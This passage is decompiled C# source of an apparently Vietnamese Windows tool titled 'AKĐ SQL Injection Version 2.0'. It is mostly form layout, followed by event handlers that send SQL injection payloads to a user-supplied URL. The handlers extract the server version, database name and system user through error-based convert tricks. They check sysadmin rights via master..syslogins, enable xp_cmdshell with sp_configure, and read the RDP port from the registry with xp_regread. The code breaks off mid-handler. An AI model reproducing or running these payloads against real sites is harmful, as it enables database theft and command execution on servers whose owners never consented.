		((Control)button16).set_Location(new Point(4, 506));
		((Control)button16).set_Name("button16");
		((Control)button16).set_Size(new Size(81, 23));
		((Control)button16).set_TabIndex(21);
		((Control)button16).set_Text("Tạo mới 1 DB");
		toolTip1.SetToolTip((Control)(object)button16, "Tạo mới 1 database");
		((ButtonBase)button16).set_UseVisualStyleBackColor(true);
		((Control)button16).add_Click((EventHandler)button16_Click);
		((Control)button17).set_Location(new Point(89, 506));
		((Control)button17).set_Name("button17");
		((Control)button17).set_Size(new Size(75, 23));
		((Control)button17).set_TabIndex(22);
		((Control)button17).set_Text("Drop DB");
		toolTip1.SetToolTip((Control)(object)button17, "Xóa 1 database");
		((ButtonBase)button17).set_UseVisualStyleBackColor(true);
		((Control)button17).add_Click((EventHandler)button17_Click);
		((Control)button18).set_Location(new Point(181, 291));
		((Control)button18).set_Name("button18");
		((Control)button18).set_Size(new Size(61, 23));
		((Control)button18).set_TabIndex(23);
		((Control)button18).set_Text("Lấy bảng");
		toolTip1.SetToolTip((Control)(object)button18, "Lấy hết bảng trong database");
		((ButtonBase)button18).set_UseVisualStyleBackColor(true);
		((Control)button18).add_Click((EventHandler)button18_Click);
		((Control)groupBox5).get_Controls().Add((Control)(object)listBox2);
		((Control)groupBox5).set_Location(new Point(180, 320));
		((Control)groupBox5).set_Name("groupBox5");
		((Control)groupBox5).set_Size(new Size(178, 180));
		((Control)groupBox5).set_TabIndex(24);
		groupBox5.set_TabStop(false);
		((Control)groupBox5).set_Text("Danh sách Table");
		((Control)listBox2).set_Dock((DockStyle)5);
		((ListControl)listBox2).set_FormattingEnabled(true);
		((Control)listBox2).set_Location(new Point(3, 16));
		((Control)listBox2).set_Name("listBox2");
		((Control)listBox2).set_Size(new Size(172, 160));
		((Control)listBox2).set_TabIndex(0);
		((Control)button19).set_Location(new Point(247, 291));
		((Control)button19).set_Name("button19");
		((Control)button19).set_Size(new Size(111, 23));
		((Control)button19).set_TabIndex(25);
		((Control)button19).set_Text("Xem thông tin bảng");
		toolTip1.SetToolTip((Control)(object)button19, "Xem thông tin của bảng");
		((ButtonBase)button19).set_UseVisualStyleBackColor(true);
		((Control)button19).add_Click((EventHandler)button19_Click);
		((Control)button20).set_Location(new Point(180, 506));
		((Control)button20).set_Name("button20");
		((Control)button20).set_Size(new Size(75, 23));
		((Control)button20).set_TabIndex(26);
		((Control)button20).set_Text("Drop Table");
		toolTip1.SetToolTip((Control)(object)button20, "Chỉ xóa đc. bảng ko có các giằng buộc");
		((ButtonBase)button20).set_UseVisualStyleBackColor(true);
		((Control)button20).add_Click((EventHandler)button20_Click);
		((Control)groupBox6).get_Controls().Add((Control)(object)checkedListBox1);
		((Control)groupBox6).set_Location(new Point(377, 320));
		((Control)groupBox6).set_Name("groupBox6");
		((Control)groupBox6).set_Size(new Size(166, 180));
		((Control)groupBox6).set_TabIndex(27);
		groupBox6.set_TabStop(false);
		((Control)groupBox6).set_Text("Danh sách Column");
		((Control)checkedListBox1).set_Dock((DockStyle)5);
		((ListControl)checkedListBox1).set_FormattingEnabled(true);
		((Control)checkedListBox1).set_Location(new Point(3, 16));
		((Control)checkedListBox1).set_Name("checkedListBox1");
		((Control)checkedListBox1).set_Size(new Size(160, 154));
		((Control)checkedListBox1).set_TabIndex(0);
		((Control)button21).set_Location(new Point(377, 291));
		((Control)button21).set_Name("button21");
		((Control)button21).set_Size(new Size(70, 23));
		((Control)button21).set_TabIndex(28);
		((Control)button21).set_Text("Lấy Column");
		toolTip1.SetToolTip((Control)(object)button21, "Lấy hết Column trong bảng");
		((ButtonBase)button21).set_UseVisualStyleBackColor(true);
		((Control)button21).add_Click((EventHandler)button21_Click);
		((ToolStrip)statusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)toolStripStatusLabel1 });
		((Control)statusStrip1).set_Location(new Point(0, 562));
		((Control)statusStrip1).set_Name("statusStrip1");
		((Control)statusStrip1).set_Size(new Size(990, 22));
		((Control)statusStrip1).set_TabIndex(30);
		((Control)statusStrip1).set_Text("statusStrip1");
		((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
		((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(96, 17));
		((ToolStripItem)toolStripStatusLabel1).set_Text("AKĐ SQL Injection");
		((Control)groupBox7).get_Controls().Add((Control)(object)textBox10);
		((Control)groupBox7).get_Controls().Add((Control)(object)label10);
		((Control)groupBox7).get_Controls().Add((Control)(object)comboBox3);
		((Control)groupBox7).get_Controls().Add((Control)(object)radioButton2);
		((Control)groupBox7).get_Controls().Add((Control)(object)radioButton1);
		((Control)groupBox7).get_Controls().Add((Control)(object)button23);
		((Control)groupBox7).get_Controls().Add((Control)(object)comboBox2);
		((Control)groupBox7).get_Controls().Add((Control)(object)label9);
		((Control)groupBox7).get_Controls().Add((Control)(object)richTextBox3);
		((Control)groupBox7).set_Location(new Point(578, 291));
		((Control)groupBox7).set_Name("groupBox7");
		((Control)groupBox7).set_Size(new Size(410, 138));
		((Control)groupBox7).set_TabIndex(31);
		groupBox7.set_TabStop(false);
		((Control)groupBox7).set_Text("Query Builder");
		((Control)textBox10).set_Location(new Point(304, 80));
		((Control)textBox10).set_Name("textBox10");
		((Control)textBox10).set_Size(new Size(100, 20));
		((Control)textBox10).set_TabIndex(38);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Location(new Point(207, 87));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(59, 13));
		((Control)label10).set_TabIndex(37);
		((Control)label10).set_Text("where id = ");
		((ListControl)comboBox3).set_FormattingEnabled(true);
		comboBox3.get_Items().AddRange(new object[5] { "Lấy 5 bản ghi", "Lấy 10 bản ghi", "Lấy 20 bản ghi", "Lấy từng bản ghi", "Lấy hết bản ghi" });
		((Control)comboBox3).set_Location(new Point(210, 80));
		((Control)comboBox3).set_Name("comboBox3");
		((Control)comboBox3).set_Size(new Size(107, 21));
		((Control)comboBox3).set_TabIndex(4);
		((Control)comboBox3).set_Text("Lấy hết bản ghi");
		comboBox3.add_SelectedIndexChanged((EventHandler)comboBox3_SelectedIndexChanged);
		((ListControl)comboBox3).add_SelectedValueChanged((EventHandler)comboBox3_SelectedValueChanged);
		((ListControl)comboBox3).add_DisplayMemberChanged((EventHandler)comboBox3_DisplayMemberChanged);
		((Control)radioButton2).set_AutoSize(true);
		radioButton2.set_Checked(true);
		((Control)radioButton2).set_Location(new Point(299, 59));
		((Control)radioButton2).set_Name("radioButton2");
		((Control)radioButton2).set_Size(new Size(109, 17));
		((Control)radioButton2).set_TabIndex(6);
		radioButton2.set_TabStop(true);
		((Control)radioButton2).set_Text("Lấy nhiều bản ghi");
		((ButtonBase)radioButton2).set_UseVisualStyleBackColor(true);
		((Control)radioButton1).set_AutoSize(true);
		((Control)radioButton1).set_Location(new Point(204, 59));
		((Control)radioButton1).set_Name("radioButton1");
		((Control)radioButton1).set_Size(new Size(89, 17));
		((Control)radioButton1).set_TabIndex(5);
		radioButton1.set_TabStop(true);
		((Control)radioButton1).set_Text("Lấy 1 bản ghi");
		((ButtonBase)radioButton1).set_UseVisualStyleBackColor(true);
		radioButton1.add_CheckedChanged((EventHandler)radioButton1_CheckedChanged);
		((Control)button23).set_Location(new Point(207, 109));
		((Control)button23).set_Name("button23");
		((Control)button23).set_Size(new Size(110, 23));
		((Control)button23).set_TabIndex(3);
		((Control)button23).set_Text("Select");
		toolTip1.SetToolTip((Control)(object)button23, "Nếu bạn chọn kiểu select theo nhiều bản ghi (select 5 bản ghi, select 10 bản ghi, select 20 bản ghi) thì khi muốn\r\nlấy tiếp các bản ghi tiếp theo bạn chỉ cần bấm select .");
		((ButtonBase)button23).set_UseVisualStyleBackColor(true);
		((Control)button23).add_Click((EventHandler)button23_Click);
		((ListControl)comboBox2).set_FormattingEnabled(true);
		((Control)comboBox2).set_Location(new Point(210, 32));
		((Control)comboBox2).set_Name("comboBox2");
		((Control)comboBox2).set_Size(new Size(107, 21));
		((Control)comboBox2).set_TabIndex(2);
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Location(new Point(207, 16));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(82, 13));
		((Control)label9).set_TabIndex(1);
		((Control)label9).set_Text("Lọc theo trường");
		((Control)richTextBox3).set_Location(new Point(6, 16));
		((Control)richTextBox3).set_Name("richTextBox3");
		((TextBoxBase)richTextBox3).set_ReadOnly(true);
		((Control)richTextBox3).set_Size(new Size(198, 116));
		((Control)richTextBox3).set_TabIndex(0);
		((Control)richTextBox3).set_Text("");
		((Control)button24).set_Location(new Point(543, 373));
		((Control)button24).set_Name("button24");
		((Control)button24).set_Size(new Size(35, 23));
		((Control)button24).set_TabIndex(32);
		((Control)button24).set_Text(">>");
		((ButtonBase)button24).set_UseVisualStyleBackColor(true);
		((Control)button24).add_Click((EventHandler)button24_Click);
		((Control)groupBox8).get_Controls().Add((Control)(object)richTextBox4);
		((Control)groupBox8).set_Location(new Point(578, 430));
		((Control)groupBox8).set_Name("groupBox8");
		((Control)groupBox8).set_Size(new Size(410, 105));
		((Control)groupBox8).set_TabIndex(33);
		groupBox8.set_TabStop(false);
		((Control)groupBox8).set_Text("Result");
		((Control)richTextBox4).set_Dock((DockStyle)5);
		((Control)richTextBox4).set_Location(new Point(3, 16));
		((Control)richTextBox4).set_Name("richTextBox4");
		((Control)richTextBox4).set_Size(new Size(404, 86));
		((Control)richTextBox4).set_TabIndex(0);
		((Control)richTextBox4).set_Text("");
		toolStrip3.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)toolStripDropDownButton4,
			(ToolStripItem)toolStripDropDownButton5,
			(ToolStripItem)toolStripDropDownButton1
		});
		((Control)toolStrip3).set_Location(new Point(0, 0));
		((Control)toolStrip3).set_Name("toolStrip3");
		((Control)toolStrip3).set_Size(new Size(990, 25));
		((Control)toolStrip3).set_TabIndex(35);
		((Control)toolStrip3).set_Text("toolStrip3");
		((ToolStripItem)toolStripDropDownButton4).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripDropDownItem)toolStripDropDownButton4).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[10]
		{
			(ToolStripItem)toolStripMenuItem1,
			(ToolStripItem)toolStripMenuItem2,
			(ToolStripItem)toolStripMenuItem3,
			(ToolStripItem)toolStripMenuItem4,
			(ToolStripItem)toolStripMenuItem5,
			(ToolStripItem)toolStripMenuItem6,
			(ToolStripItem)toolStripMenuItem7,
			(ToolStripItem)toolStripMenuItem8,
			(ToolStripItem)toolStripMenuItem9,
			(ToolStripItem)toolStripMenuItem10
		});
		((ToolStripItem)toolStripDropDownButton4).set_Image((Image)componentResourceManager.GetObject("toolStripDropDownButton4.Image"));
		((ToolStripItem)toolStripDropDownButton4).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)toolStripDropDownButton4).set_Name("toolStripDropDownButton4");
		((ToolStripItem)toolStripDropDownButton4).set_Size(new Size(71, 22));
		((ToolStripItem)toolStripDropDownButton4).set_Text("Điều khiển");
		((ToolStripItem)toolStripMenuItem1).set_Name("toolStripMenuItem1");
		((ToolStripItem)toolStripMenuItem1).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem1).set_Text("Exploit");
		((ToolStripItem)toolStripMenuItem1).set_ToolTipText("Bắt đầu khai thác");
		((ToolStripItem)toolStripMenuItem1).add_Click((EventHandler)button1_Click);
		((ToolStripItem)toolStripMenuItem2).set_Name("toolStripMenuItem2");
		((ToolStripItem)toolStripMenuItem2).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem2).set_Text("KT System_User");
		((ToolStripItem)toolStripMenuItem2).set_ToolTipText("Kiểm tra xem System User hiện tại có bằng quyền với SA ko");
		((ToolStripItem)toolStripMenuItem2).add_Click((EventHandler)button2_Click);
		((ToolStripItem)toolStripMenuItem3).set_Name("toolStripMenuItem3");
		((ToolStripItem)toolStripMenuItem3).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem3).set_Text("KT Cổng Remote");
		((ToolStripItem)toolStripMenuItem3).set_ToolTipText("Kiểm tra cổng remote desktop server là bao nhiêu");
		((ToolStripItem)toolStripMenuItem3).add_Click((EventHandler)button4_Click);
		((ToolStripItem)toolStripMenuItem4).set_Name("toolStripMenuItem4");
		((ToolStripItem)toolStripMenuItem4).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem4).set_Text("Enable xp_cmdshell");
		((ToolStripItem)toolStripMenuItem4).set_ToolTipText("Enable xp_cmdshell trong MSSQL 2005");
		((ToolStripItem)toolStripMenuItem4).add_Click((EventHandler)button3_Click);
		((ToolStripItem)toolStripMenuItem5).set_Name("toolStripMenuItem5");
		((ToolStripItem)toolStripMenuItem5).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem5).set_Text("Upload File");
		((ToolStripItem)toolStripMenuItem5).set_ToolTipText("Upload file lên server");
		((ToolStripItem)toolStripMenuItem5).add_Click((EventHandler)button12_Click);
		((ToolStripItem)toolStripMenuItem6).set_Name("toolStripMenuItem6");
		((ToolStripItem)toolStripMenuItem6).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem6).set_Text("Registry");
		((ToolStripItem)toolStripMenuItem6).set_ToolTipText("Tương tác với Registry server");
		((ToolStripItem)toolStripMenuItem6).add_Click((EventHandler)button13_Click);
		((ToolStripItem)toolStripMenuItem7).set_Name("toolStripMenuItem7");
		((ToolStripItem)toolStripMenuItem7).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem7).set_Text("Lấy list DB trên server");
		((ToolStripItem)toolStripMenuItem7).set_ToolTipText("Lấy danh sách database trên server");
		((ToolStripItem)toolStripMenuItem7).add_Click((EventHandler)button15_Click);
		((ToolStripItem)toolStripMenuItem8).set_Name("toolStripMenuItem8");
		((ToolStripItem)toolStripMenuItem8).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem8).set_Text("Lấy bảng");
		((ToolStripItem)toolStripMenuItem8).set_ToolTipText("Lấy bảng trong databse");
		((ToolStripItem)toolStripMenuItem8).add_DisplayStyleChanged((EventHandler)button18_Click);
		((ToolStripItem)toolStripMenuItem9).set_Name("toolStripMenuItem9");
		((ToolStripItem)toolStripMenuItem9).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem9).set_Text("Lấy trường");
		((ToolStripItem)toolStripMenuItem9).set_ToolTipText("Lấy trường trong bảng");
		((ToolStripItem)toolStripMenuItem9).add_DisplayStyleChanged((EventHandler)button21_Click);
		((ToolStripItem)toolStripMenuItem10).set_Name("toolStripMenuItem10");
		((ToolStripItem)toolStripMenuItem10).set_Size(new Size(177, 22));
		((ToolStripItem)toolStripMenuItem10).set_Text("Close");
		((ToolStripItem)toolStripMenuItem10).add_Click((EventHandler)toolStripMenuItem10_Click);
		((ToolStripItem)toolStripDropDownButton5).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripDropDownItem)toolStripDropDownButton5).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripMenuItem11,
			(ToolStripItem)toolStripMenuItem12
		});
		((ToolStripItem)toolStripDropDownButton5).set_Image((Image)componentResourceManager.GetObject("toolStripDropDownButton5.Image"));
		((ToolStripItem)toolStripDropDownButton5).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)toolStripDropDownButton5).set_Name("toolStripDropDownButton5");
		((ToolStripItem)toolStripDropDownButton5).set_Size(new Size(48, 22));
		((ToolStripItem)toolStripDropDownButton5).set_Text("About");
		((ToolStripItem)toolStripMenuItem11).set_Name("toolStripMenuItem11");
		((ToolStripItem)toolStripMenuItem11).set_Size(new Size(182, 22));
		((ToolStripItem)toolStripMenuItem11).set_Text("Lời cám ơn và gửi tặng");
		((ToolStripItem)toolStripMenuItem11).add_Click((EventHandler)toolStripMenuItem11_Click);
		((ToolStripItem)toolStripMenuItem12).set_Name("toolStripMenuItem12");
		((ToolStripItem)toolStripMenuItem12).set_Size(new Size(182, 22));
		((ToolStripItem)toolStripMenuItem12).set_Text("Phiên bản và tác giả");
		((ToolStripItem)toolStripMenuItem12).add_Click((EventHandler)toolStripMenuItem12_Click);
		((ToolStripItem)toolStripDropDownButton1).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripDropDownItem)toolStripDropDownButton1).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripMenuItem_0,
			(ToolStripItem)englishToolStripMenuItem
		});
		((ToolStripItem)toolStripDropDownButton1).set_Image((Image)componentResourceManager.GetObject("toolStripDropDownButton1.Image"));
		((ToolStripItem)toolStripDropDownButton1).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)toolStripDropDownButton1).set_Name("toolStripDropDownButton1");
		((ToolStripItem)toolStripDropDownButton1).set_Size(new Size(68, 22));
		((ToolStripItem)toolStripDropDownButton1).set_Text("Language");
		toolStripMenuItem_0.set_Checked(true);
		toolStripMenuItem_0.set_CheckState((CheckState)1);
		((ToolStripItem)toolStripMenuItem_0).set_Name("tiếngViệtToolStripMenuItem");
		((ToolStripItem)toolStripMenuItem_0).set_Size(new Size(122, 22));
		((ToolStripItem)toolStripMenuItem_0).set_Text("Tiếng Việt");
		((ToolStripItem)toolStripMenuItem_0).add_Click((EventHandler)toolStripMenuItem_0_Click);
		((ToolStripItem)englishToolStripMenuItem).set_Name("englishToolStripMenuItem");
		((ToolStripItem)englishToolStripMenuItem).set_Size(new Size(122, 22));
		((ToolStripItem)englishToolStripMenuItem).set_Text("English");
		((ToolStripItem)englishToolStripMenuItem).add_Click((EventHandler)englishToolStripMenuItem_Click);
		((Control)button22).set_Location(new Point(377, 506));
		((Control)button22).set_Name("button22");
		((Control)button22).set_Size(new Size(166, 23));
		((Control)button22).set_TabIndex(36);
		((Control)button22).set_Text("Tổng số bản ghi trong bảng");
		toolTip1.SetToolTip((Control)(object)button22, "Xem bảng này có bao nhiêu bản ghi");
		((ButtonBase)button22).set_UseVisualStyleBackColor(true);
		((Control)button22).add_Click((EventHandler)button22_Click_1);
		((Control)button25).set_Location(new Point(875, 536));
		((Control)button25).set_Name("button25");
		((Control)button25).set_Size(new Size(113, 23));
		((Control)button25).set_TabIndex(37);
		((Control)button25).set_Text("Save kết quả ra file");
		((ButtonBase)button25).set_UseVisualStyleBackColor(true);
		((Control)button25).add_Click((EventHandler)button25_Click_1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((ScrollableControl)this).set_AutoScroll(true);
		((Form)this).set_ClientSize(new Size(990, 584));
		((Control)this).get_Controls().Add((Control)(object)button25);
		((Control)this).get_Controls().Add((Control)(object)button22);
		((Control)this).get_Controls().Add((Control)(object)toolStrip3);
		((Control)this).get_Controls().Add((Control)(object)groupBox8);
		((Control)this).get_Controls().Add((Control)(object)button24);
		((Control)this).get_Controls().Add((Control)(object)groupBox7);
		((Control)this).get_Controls().Add((Control)(object)statusStrip1);
		((Control)this).get_Controls().Add((Control)(object)button21);
		((Control)this).get_Controls().Add((Control)(object)groupBox6);
		((Control)this).get_Controls().Add((Control)(object)button20);
		((Control)this).get_Controls().Add((Control)(object)button19);
		((Control)this).get_Controls().Add((Control)(object)groupBox5);
		((Control)this).get_Controls().Add((Control)(object)button18);
		((Control)this).get_Controls().Add((Control)(object)button17);
		((Control)this).get_Controls().Add((Control)(object)button16);
		((Control)this).get_Controls().Add((Control)(object)groupBox4);
		((Control)this).get_Controls().Add((Control)(object)button15);
		((Control)this).get_Controls().Add((Control)(object)groupBox3);
		((Control)this).get_Controls().Add((Control)(object)button13);
		((Control)this).get_Controls().Add((Control)(object)button12);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)button6);
		((Control)this).get_Controls().Add((Control)(object)button5);
		((Control)this).get_Controls().Add((Control)(object)textBox6);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("MainForm");
		((Control)this).set_Text("AKĐ SQL Injection Version 2.0");
		((Form)this).add_Load((EventHandler)MainForm_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((Control)groupBox3).ResumeLayout(false);
		((Control)groupBox3).PerformLayout();
		((Control)groupBox4).ResumeLayout(false);
		((Control)groupBox5).ResumeLayout(false);
		((Control)groupBox6).ResumeLayout(false);
		((Control)statusStrip1).ResumeLayout(false);
		((Control)statusStrip1).PerformLayout();
		((Control)groupBox7).ResumeLayout(false);
		((Control)groupBox7).PerformLayout();
		((Control)groupBox8).ResumeLayout(false);
		((Control)toolStrip3).ResumeLayout(false);
		((Control)toolStrip3).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public MainForm()
	{
		InitializeComponent();
	}

	private bool GetHtmlSource(out string responseString, Uri requestURI)
	{
		HttpWebResponse httpWebResponse = null;
		WebProxy proxy = null;
		Stream stream = null;
		MemoryStream memoryStream = null;
		MemoryStream memoryStream2 = null;
		bool result = false;
		responseString = "";
		requestURI = null;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(weblink);
			httpWebRequest.Accept = "*/*";
			httpWebRequest.Headers.Add("Accept-Language", "en-us");
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3";
			httpWebRequest.Method = "GET";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.Proxy = proxy;
			httpWebRequest.Timeout = (int)new TimeSpan(0, 0, 60).TotalMilliseconds;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				_ = httpWebResponse.CharacterSet;
				stream = httpWebResponse.GetResponseStream();
				result = true;
			}
			catch (WebException ex)
			{
				result = false;
				if (ex.Response == null)
				{
					stream = null;
					responseString = "<html><body>" + ex.Message + "</body></html>";
					return result;
				}
				stream = ex.Response!.GetResponseStream();
			}
			finally
			{
				requestURI = httpWebRequest.RequestUri;
			}
			if (stream != null)
			{
				memoryStream = new MemoryStream();
				memoryStream2 = new MemoryStream();
				Utilities.CopyStream(stream, memoryStream);
				memoryStream.Position = 0L;
				Utilities.CopyStream(memoryStream, memoryStream2);
				responseString = Utilities.GetStreamHTMLData(memoryStream, null, supportSeek: true);
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
		finally
		{
			stream?.Close();
			memoryStream?.Close();
			memoryStream2?.Close();
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_02b3: Unknown result type (might be due to invalid IL or missing references)
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		((Control)button2).set_Enabled(true);
		((Control)button3).set_Enabled(true);
		((Control)button4).set_Enabled(true);
		((Control)button5).set_Enabled(true);
		((Control)button6).set_Enabled(true);
		((Control)button7).set_Enabled(true);
		((Control)button8).set_Enabled(true);
		((Control)button9).set_Enabled(true);
		((Control)button10).set_Enabled(true);
		((Control)button11).set_Enabled(true);
		((Control)button12).set_Enabled(true);
		((Control)button13).set_Enabled(true);
		((Control)button14).set_Enabled(true);
		((Control)button15).set_Enabled(true);
		((Control)button16).set_Enabled(true);
		((Control)button17).set_Enabled(true);
		((Control)button18).set_Enabled(true);
		((Control)button19).set_Enabled(true);
		((Control)button20).set_Enabled(true);
		((Control)button21).set_Enabled(true);
		((Control)button22).set_Enabled(true);
		((Control)button23).set_Enabled(true);
		((Control)button24).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem2).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem3).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem4).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem5).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem6).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem7).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem8).set_Enabled(true);
		((ToolStripItem)toolStripMenuItem9).set_Enabled(true);
		Uri requestURI = null;
		string responseString = "";
		weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(@@version%2bchar(124)%2b@@servername%2bchar(124)%2bdb_name()%2bchar(124)%2bsystem_user))--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		int num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 7;
		int length = Convert.ToInt32(responseString.IndexOf(thongbao2)) - num;
		if (num == 6)
		{
			num = Convert.ToInt32(responseString.IndexOf(thongbao1_2)) + 12;
			length = Convert.ToInt32(responseString.IndexOf(thongbao2_2)) - num;
			if (num == 11)
			{
				num = Convert.ToInt32(responseString.IndexOf(thongbao1_3)) + 16;
				length = Convert.ToInt32(responseString.IndexOf(thongbao2_3)) - num;
			}
		}
		try
		{
			string[] array = responseString.Substring(num, length).Split(new char[1] { '|' });
			((Control)richTextBox1).set_Text(array[0]);
			((Control)textBox3).set_Text(array[1]);
			((Control)textBox4).set_Text(array[2]);
			((Control)textBox5).set_Text(array[3]);
			load = 1;
		}
		catch (Exception)
		{
			MessageBox.Show("Không thể lấy được dữ liệu");
			load = 1;
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		string responseString = "";
		Uri requestURI = null;
		weblink = ((Control)textBox1).get_Text() + ";drop table check_sysuser create table check_sysuser (id int identity,noi_dung varchar(1000)) insert into check_sysuser select sysadmin from master..syslogins where name = system_user--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		responseString = "";
		requestURI = null;
		weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 noi_dung%2bchar(47) from check_sysuser where id=1))--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		string text = ((Control)textBox5).get_Text();
		((Control)textBox5).set_Text("");
		int num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 7;
		if (num == 6)
		{
			num = Convert.ToInt32(responseString.IndexOf(thongbao1_2)) + 12;
			if (num == 11)
			{
				num = Convert.ToInt32(responseString.IndexOf(thongbao1_3)) + 16;
			}
		}
		if (responseString.Substring(num, 1).ToString() == "0")
		{
			((Control)textBox5).set_Text(text + " (Không ngang bằng SA)");
			MessageBox.Show("System User không ngang bằng SA");
			load = 1;
		}
		else if (responseString.Substring(num, 1).ToString() == "1")
		{
			((Control)textBox5).set_Text(text + " (Ngang bằng SA)");
			MessageBox.Show("System User ngang bằng SA");
			load = 1;
		}
		else
		{
			((Control)textBox5).set_Text(text);
			MessageBox.Show("Không kiểm tra được");
			load = 1;
		}
	}

	private void button3_Click(object sender, EventArgs e)
	{
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		string responseString = "";
		Uri requestURI = null;
		weblink = ((Control)textBox1).get_Text() + ";exec sp_configure \"show advanced options\", 1--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + ";reconfigure--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + ";exec sp_configure \"xp_cmdshell\", 1--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + ";reconfigure--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		load = 1;
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		Uri requestURI = null;
		string responseString = "";
		weblink = ((Control)textBox1).get_Text() + ";drop table millkak create table millkak (id int identity,noi_dung1 varchar(99), noi_dung2 varchar(99)) insert into millkak EXEC master..xp_regread HKEY_LOCAL_MACHINE,\"System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\\",PortNumber--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 noi_dung1%2b'/'%2bnoi_dung2 from millkak where id=1))--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		int num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 18;
		int length = Convert.ToInt32(responseString.IndexOf(thongbao2)) - num;
		if (num == 17)
		{
			num = Convert.ToInt32(responseString.IndexOf(thongbao1_2)) + 23;
			length = Convert.ToInt32(responseString.IndexOf(thongbao2_2)) - num;
			if (num == 22)
			{
